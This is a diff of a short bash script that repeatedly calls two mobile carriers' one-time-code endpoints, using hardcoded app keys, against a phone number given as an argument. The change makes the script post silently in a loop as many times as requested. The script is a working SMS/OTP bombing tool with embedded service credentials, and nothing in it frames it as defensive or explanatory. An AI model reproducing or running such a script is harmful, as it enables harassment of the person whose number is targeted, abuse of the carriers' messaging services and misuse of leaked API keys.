@@ -1,21 +1,19 @@
 #!/bin/bash
-echo $1 $2 $3 
+echo "Operator: $1; Target: $2; Amount: $3"
 len=("$3")
+p=("$2")
 blpin(){
-#i=1
 for i in $( eval echo {0..${len}} )
 do
-curl -s "https://circle.happycell.mobi/mylife/appapi/appcall.php?op=getOTC&pin=19823&app_version=75&msisdn='${2}'" --header 'x-app-key: 0skgg0ksg4880840w8w4gco0k4wckw0cg0w0w88s' -L
-#i=$(($i + 1))
+curl --silent --output /dev/null --location --request POST 'https://circle.happycell.mobi/mylife/appapi/appcall.php?op=getOTC&pin=19823&app_version=75&msisdn=88'"${p}"'' --header 'x-app-key: 0skgg0ksg4880840w8w4gco0k4wckw0cg0w0w88s'
+echo $i
 done
 }
-
 rbpin(){
-#i=1
 for i in $( eval echo {0..${len}} )
 do
-curl -s "https://circle.robi.com.bd/mylife/appapi/appcall.php?op=getOTC&pin=19823&app_version=75&msisdn='${2}'" --header 'x-app-key: 000oc0so48owkw4s0wwo4c00g00804w80gwkw8kg' -L
-#i=$(($i + 1))
+curl --silent --output /dev/null --location --request POST 'https://circle.robi.com.bd/mylife/appapi/appcall.php?op=getOTC&pin=19823&app_version=75&msisdn=88'"${p}"'' --header 'x-app-key: 000oc0so48owkw4s0wwo4c00g00804w80gwkw8kg'
+echo $i
 done
 }
 
